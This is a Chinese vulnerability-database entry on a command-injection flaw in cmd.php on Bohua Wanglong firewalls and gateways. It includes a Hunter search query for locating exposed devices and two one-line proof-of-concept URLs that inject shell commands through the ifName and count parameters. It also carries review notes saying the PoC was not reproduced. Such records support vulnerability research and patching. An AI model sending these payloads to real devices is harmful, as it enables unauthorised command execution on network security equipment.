---
source: "wy876 漏洞文库"
title: "博华网龙安全设备 cmd.php ping/arping命令注入"
product: "博华网龙安全设备"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "防火墙/一体机/网关型号及固件均未列"
prerequisites: "仅URL，身份要求未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ognnq9azp0fodi9b"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87cmd.php%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.title="
hunter: "web.title=\"博华网龙\""
id: "vw-47fcc13c540b82ac618de9ec"
entity_id: "ve-47fcc13c540b82ac618de9ec"
schema_version: "1"
---

# 博华网龙安全设备 cmd.php ping/arping命令注入

## 条目说明

- 对象与具体问题：博华网龙安全设备；cmd.php ping/arping命令注入
- 版本、配置及部署条件：防火墙/一体机/网关型号及固件均未列
- 认证与权限前提：仅URL，身份要求未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 两个action分别ifName/count不同输入位置，合并接口族但保留两个变体
- 无HTTP/响应、对照、源码/修复，三产品线不能仅由厂商介绍确认受影响
- Hunter语法入FOFA残缺字段

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
中科博华是一家集科研、产品开发、技术服务、系统集成为一体的高科技企业，是国家商用密码产品定点生产单位，具有商用密码生产和销售许可证、3C认证、系统集成叁级资质、信息安全服务一级资质和涉密资质等。中科博华多个安全设备系统存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限。

## 二、影响版本
+ 博华网龙防火墙
+ 博华网龙信息安全一体机
+ 博华网龙安全网关

## 三、资产测绘
+ hunter`web.title="博华网龙"`
+ 特征


## 四、漏洞复现
**poc1:**

```plain
/diagnostics/cmd.php?action=arping&ifName=|id||
```


**poc2:**

```plain
/diagnostics/cmd.php?action=ping&count=||id||
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ognnq9azp0fodi9b>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
